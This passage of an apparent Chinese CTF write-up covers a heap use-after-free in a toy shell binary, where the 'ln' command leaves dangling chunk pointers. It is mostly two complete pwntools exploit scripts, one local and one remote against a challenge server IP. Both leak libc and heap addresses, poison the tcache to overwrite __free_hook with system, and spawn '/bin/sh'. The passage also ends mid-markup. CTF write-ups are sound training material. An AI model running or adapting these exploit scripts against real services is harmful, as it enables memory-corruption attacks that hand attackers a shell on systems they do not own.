(复制chunk指针)</span><br><span class=\"line\"></span><br><span class=\"line\">filedata_base: 0xa0e8 qword[6*i] 一个0x208byte</span><br><span class=\"line\">fileflag_base: 0xa0c0 </span><br><span class=\"line\">fileflag_base+6*i: flag,==1表示文件存在，==0表示文件不存在</span><br><span class=\"line\">fileflag_base+48*i+8: filaname</span><br></pre></td></tr></table></figure>\n\n<p>可以看到存在UAF：ln可将同一个<code>chunk</code>指针挂载到多个<code>file</code>中，但<code>rm</code>删除是按照<code>filename</code>删除一个<code>file</code>，仍可通过其他<code>file</code>控制该<code>chunk</code>指针。</p>\n<p>如果这样的话首先利用<code>unsorted bin</code>泄露出堆指针和libcbase， 之后利用<code>UAF</code>走<code>tcache poison</code>劫持<code>free_hook</code>来<code>get shell</code>。</p>\n<p>本地还能用下<code>one_gadget</code>，远程估计只能通过<code>malloc_hook</code>用’LibcSearcher’搜<code>libc</code>，之后走<code>system(&quot;&quot;/bin/sh\\x00&quot;)</code>。</p>\n<p>本地exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;sh_v1.1&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;121.40.89.206&#x27;</span>,<span class=\"number\">34883</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ls</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ls&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ru(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;cat &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">touch</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;touch &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gedit</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;gedit &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rm</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;rm &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ln</span>(<span class=\"params\">src,dest</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ln &#x27;</span>+<span class=\"built_in\">str</span>(src)+<span class=\"string\">&#x27; &#x27;</span>+<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"comment\"># file0 --&gt; file6</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># use to leak libc</span></span><br><span class=\"line\"><span class=\"comment\"># file7 == file8</span></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file9&#x27;</span>,<span class=\"string\">&#x27;cccccccc&#x27;</span>) <span class=\"comment\"># escape for being combined into top chunk</span></span><br><span class=\"line\"><span class=\"comment\"># use to leak heap</span></span><br><span class=\"line\"><span class=\"comment\"># file1 == file10</span></span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file1&#x27;</span>,<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  rm(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file7&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">libc_addr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">malloc_hook=libc_addr-<span class=\"number\">96</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">libcbase=malloc_hook-libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">free_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap addr</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x2a0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite free hook</span></span><br><span class=\"line\">payload=p64(free_hook)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">gedit(<span class=\"string\">&#x27;file10&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">11</span>+i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;sys_addr&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;malloc_hook&#x27;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;free_hook&#x27;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;heapbase&#x27;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get free_hook</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file17&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file18&#x27;</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file18&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>远程exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;sh_v1.1&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;./libc-2.31.so&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;121.40.89.206&#x27;</span>,<span class=\"number\">34883</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ls</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ls&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ru(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;cat &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">touch</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;touch &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gedit</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;gedit &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rm</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;rm &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ln</span>(<span class=\"params\">src,dest</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ln &#x27;</span>+<span class=\"built_in\">str</span>(src)+<span class=\"string\">&#x27; &#x27;</span>+<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"comment\"># file0 --&gt; file6</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># use to leak libc</span></span><br><span class=\"line\"><span class=\"comment\"># file7 == file8</span></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file9&#x27;</span>,<span class=\"string\">&#x27;cccccccc&#x27;</span>) <span class=\"comment\"># escape for being combined into top chunk</span></span><br><span class=\"line\"><span class=\"comment\"># use to leak heap</span></span><br><span class=\"line\"><span class=\"comment\"># file1 == file10</span></span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file1&#x27;</span>,<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  rm(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file7&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">libc_addr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">malloc_hook=libc_addr-<span class=\"number\">96</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap addr</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x2a0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class=\"line\">libcbase=malloc_hook-libc.dump(<span class=\"string\">&#x27;__malloc_hook&#x27;</span>)</span><br><span class=\"line\">free_hook=libcbase+libc.dump(<span class=\"string\">&#x27;__free_hook&#x27;</span>)</span><br><span class=\"line\">sys_addr=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;sys_addr&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;malloc_hook&#x27;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;free_hook&#x27;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;heapbase&#x27;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite free_hook</span></span><br><span class=\"line\">payload=p64(free_hook)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">gedit(<span class=\"string\">&#x27;file10&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">11</span>+i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get free_hook</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file17&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file18&#x27;</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file18&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>感觉是一个有问题的shell，应该是UAF。</p>","more":"<p>64位保护全开，写的是一个shell。</p>\n<p>输入以空格<code>&#39; &#39;</code>分割三个参数，存储在bss段中处理。</p>\n<p>代码有很多干扰</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span 